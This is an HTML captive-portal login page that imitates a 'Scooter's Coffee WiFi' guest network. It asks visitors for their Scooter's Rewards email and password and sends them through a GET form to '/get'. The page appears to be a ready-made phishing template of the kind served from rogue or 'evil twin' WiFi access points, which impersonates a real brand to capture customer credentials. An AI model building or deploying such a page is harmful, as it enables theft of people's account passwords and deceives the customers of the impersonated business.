<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Scooter's Coffee WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#FF6600;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.25)}
.top{background:#FF6600;padding:26px 24px 18px;text-align:center}
.brand{font-size:26px;font-weight:900;color:#fff;letter-spacing:0.5px}
.tagline{font-size:9.5px;color:rgba(255,255,255,0.75);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.mid{background:#CC5200;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#fff;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:rgba(255,255,255,0.85)}
.mid strong{color:#fff}
.body{padding:24px}
h2{font-size:17px;font-weight:700;color:#FF6600;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #ffe0cc;border-radius:8px;font-size:14.5px;background:#fff9f5;color:#1a1a1a;font-family:inherit}
input:focus{outline:none;border-color:#FF6600}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#FF6600;color:#fff;font-size:13px;font-weight:700;cursor:pointer}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#FF6600}
.foot{background:#fff9f5;border-top:1px solid #ffe0cc;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#FF6600}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brand">Scooter's Coffee</div>
    <div class="tagline">Amazing People. Amazing Drinks. Amazingly Fast.</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>Scooters_WiFi</strong></span></div>
  <div class="body">
    <h2>Guest WiFi Access</h2>
    <p class="sub">Sign in with your Scooter's Rewards account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi →</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Scooter's Coffee</span><a href="#">Help</a></div>
</div>
</body>
</html>
